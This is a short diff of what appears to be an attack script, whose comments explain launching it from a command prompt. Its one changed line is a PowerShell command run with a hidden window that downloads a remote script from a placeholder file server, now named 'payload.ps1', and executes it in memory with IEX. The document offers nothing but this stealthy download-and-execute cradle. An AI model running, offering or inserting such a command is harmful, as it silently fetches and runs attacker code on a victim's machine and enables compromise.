@@ -3,4 +3,4 @@
 # Optionally, it can be run in a command prompt if you append the following string (without the single quotes) to the 
 # beginning: 'start "" '
 
-powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('[FILESERVER_ADRESS]');"
+powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('[FILESERVER_ADRESS]/payload.ps1');"
